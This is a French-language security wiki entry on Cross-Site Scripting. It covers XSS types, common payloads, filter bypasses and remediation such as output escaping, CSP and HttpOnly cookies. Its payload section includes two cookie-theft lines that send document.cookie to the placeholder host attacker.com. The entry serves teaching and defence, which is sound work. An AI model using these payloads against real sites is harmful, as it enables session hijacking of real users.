---
tags: [vulnerability, web, xss]
vuln_name: "Cross-Site Scripting"
owasp_category: "A03:2021 - Injection"
cvss_score: 6.1
last_updated: 2024-01-01
---

# 🐛 Cross-Site Scripting (XSS)

## 📖 Description

> Injection de scripts malveillants dans des pages web vues par d'autres utilisateurs. Permet de voler des cookies, rediriger des utilisateurs ou effectuer des actions en leur nom.

**OWASP :** A03:2021 — Injection  
**CVSS Score moyen :** 6.1 (Medium)

---

## 🔬 Types de XSS

| Type | Description | Persistance |
|------|-------------|-------------|
| **Reflected** | Payload dans l'URL, reflété dans la réponse | Non persistant |
| **Stored** | Payload stocké en BDD, affiché à chaque visite | Persistant ⚠️ |
| **DOM-Based** | Manipulation du DOM côté client | Variable |

---

## 💥 Payloads courants

### Test basique

```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
"><script>alert('XSS')</script>
javascript:alert('XSS')
```

### Vol de cookie (impact réel)

```html
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
<img src=x onerror="fetch('http://attacker.com/steal?c='+document.cookie)">
```

### Bypass de filtres

```html
<ScRiPt>alert('XSS')</ScRiPt>
<script>alert`XSS`</script>
<svg onload=alert('XSS')>
```

---

## 🛡️ Remédiation

- **Échappement des sorties** — encoder `<`, `>`, `"`, `'`, `&`
- **Content Security Policy (CSP)** — header HTTP limitant les scripts
- **HttpOnly cookies** — inaccessibles via JavaScript
- **Validation des entrées** — côté serveur uniquement

---

## 🔗 Ressources

- [PortSwigger XSS Labs](https://portswigger.net/web-security/cross-site-scripting)
- [PayloadsAllTheThings — XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
